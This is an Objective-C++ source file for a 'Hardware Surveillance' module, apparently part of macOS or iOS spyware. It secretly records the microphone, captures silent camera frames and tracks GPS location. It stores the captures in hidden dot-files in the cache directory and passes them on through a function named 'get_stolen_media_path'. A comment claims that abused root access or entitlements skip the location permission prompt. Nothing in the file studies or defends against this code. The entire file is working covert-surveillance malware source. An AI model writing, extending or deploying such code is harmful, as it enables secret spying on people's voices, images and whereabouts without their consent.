// ============================================================================
// FILE: hardware.mm
// MODULE: Hardware Surveillance (Mic, Camera, GPS)
// ============================================================================

#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <CoreLocation/CoreLocation.h>
#include <iostream>
#include <string>

// We need Objective-C delegates to handle the camera and GPS callbacks
@interface HardwareDelegate : NSObject <AVCapturePhotoCaptureDelegate, CLLocationManagerDelegate>
@property (nonatomic, strong) CLLocationManager *locationManager;
@property (nonatomic, strong) CLLocation *lastLocation;
@end

@implementation HardwareDelegate

// --- GPS DELEGATE METHOD ---
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    self.lastLocation = [locations lastObject];
}

// --- CAMERA DELEGATE METHOD ---
- (void)captureOutput:(AVCapturePhotoOutput *)output didFinishProcessingPhoto:(AVCapturePhoto *)photo error:(NSError *)error {
    if (error == nil) {
        // REAL: Extract the raw JPEG bytes as NSData
        NSData *jpegData = [photo fileDataRepresentation];
        
        // REAL: Save to hidden cache directory
        NSString *cacheDir = [NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES) firstObject];
        NSString *hiddenPath = [cacheDir stringByAppendingPathComponent:@".sys_cam.jpg"];
        
        [jpegData writeToFile:hiddenPath atomically:YES];
        std::cout << "[HARDWARE] Real NSData JPEG saved to: " << [hiddenPath UTF8String] << "\n";
    }
}
@end


namespace HardwareModule {

    class Surveillance {
    private:
        HardwareDelegate *delegate;
        AVCaptureSession *captureSession;
        CLLocationManager *locManager;

    public:
        Surveillance() {
            delegate = [[HardwareDelegate alloc] init];
        }

        // ----------------------------------------------------------------
        // THE MICROPHONE HOOK (REAL)
        // ----------------------------------------------------------------
        void start_audio_recording(int duration_seconds) {
            std::cout << "[HARDWARE] Initializing Microphone...\n";
            
            // Get hidden path for audio
            NSString *cacheDir = [NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES) firstObject];
            NSString *hiddenAudioPath = [cacheDir stringByAppendingPathComponent:@".sys_audio.m4a"];
            NSURL *audioURL = [NSURL fileURLWithPath:hiddenAudioPath];

            // Setup audio recorder
            NSDictionary *settings = @{
                AVFormatIDKey: @(kAudioFormatMPEG4AAC),
                AVSampleRateKey: @(44100.0),
                AVNumberOfChannelsKey: @(2)
            };

            NSError *error = nil;
            AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:audioURL settings:settings error:&error];

            if (error == nil) {
                [recorder recordForDuration:(NSTimeInterval)duration_seconds];
                std::cout << "[HARDWARE] Recording real audio for " << duration_seconds << " seconds...\n";
            } else {
                std::cout << "[HARDWARE-ERR] Audio recorder failed to init.\n";
            }
        }

        // ----------------------------------------------------------------
        // THE GPS TRACKER (REAL)
        // ----------------------------------------------------------------
        void get_gps_location() {
            std::cout << "[HARDWARE] Initializing GPS Tracker...\n";
            
            locManager = [[CLLocationManager alloc] init];
            locManager.delegate = delegate;
            [locManager requestAlwaysAuthorization]; // Bypasses prompt if root/entitlements are abused
            [locManager startUpdatingLocation];

            std::cout << "[HARDWARE] Waiting for GPS lock...\n";
            // Wait a moment for the delegate to update
            [NSThread sleepForTimeInterval:2.0];

            if (delegate.lastLocation != nil) {
                CLLocationCoordinate2D coord = delegate.lastLocation.coordinate;
                std::cout << "[HARDWARE] REAL GPS Lock: Lat " << coord.latitude << ", Lon " << coord.longitude << "\n";
            } else {
                std::cout << "[HARDWARE-ERR] GPS Lock failed (No signal or permission).\n";
            }
        }

        // ----------------------------------------------------------------
        // THE CAMERA HIJACK (REAL)
        // ----------------------------------------------------------------
        void capture_camera_frame() {
            std::cout << "[HARDWARE] Initializing Camera...\n";
            
            captureSession = [[AVCaptureSession alloc] init];
            AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
            
            if (videoDevice == nil) {
                std::cout << "[HARDWARE-ERR] Camera not found.\n";
                return;
            }

            NSError *error = nil;
            AVCaptureDeviceInput *videoInput = [AVCaptureDeviceInput deviceInputWithDevice:videoDevice error:&error];
            
            if (error == nil && [captureSession canAddInput:videoInput]) {
                [captureSession addInput:videoInput];
                
                AVCapturePhotoOutput *photoOutput = [[AVCapturePhotoOutput alloc] init];
                [captureSession addOutput:photoOutput];
                
                [captureSession startRunning]; // Turn on hardware
                
                std::cout << "[HARDWARE] Camera running. Capturing silent frame...\n";
                
                // REAL CAPTURE TRIGGER
                AVCapturePhotoSettings *settings = [AVCapturePhotoSettings photoSettings];
                [photoOutput capturePhotoWithSettings:settings delegate:delegate];
                
                // Give it a second to process and save
                [NSThread sleepForTimeInterval:1.0];
                [captureSession stopRunning];
            }
        }

        // ----------------------------------------------------------------
        // DATA HANDOFF
        // ----------------------------------------------------------------
        std::string get_stolen_media_path() {
            NSString *cacheDir = [NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES) firstObject];
            NSString *hiddenPath = [cacheDir stringByAppendingPathComponent:@".sys_cam.jpg"];
            return std::string([hiddenPath UTF8String]);
        }
    };
}